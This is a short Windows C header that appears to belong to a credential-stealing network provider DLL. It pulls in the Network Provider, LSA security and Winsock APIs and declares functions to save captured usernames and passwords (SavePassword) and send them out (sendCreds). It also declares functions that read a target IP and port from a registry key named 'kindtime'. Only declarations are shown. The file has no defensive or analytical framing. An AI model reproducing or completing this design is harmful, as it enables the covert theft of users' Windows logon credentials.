#pragma once

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <npapi.h>

#pragma comment(lib,"ws2_32.lib") //Winsock Library

#define rKey "SOFTWARE\\kindtime"

DWORD getPtReg();
char* getIPReg(const char*);
void SavePassword(PUNICODE_STRING, PUNICODE_STRING);
int sendCreds(char*);
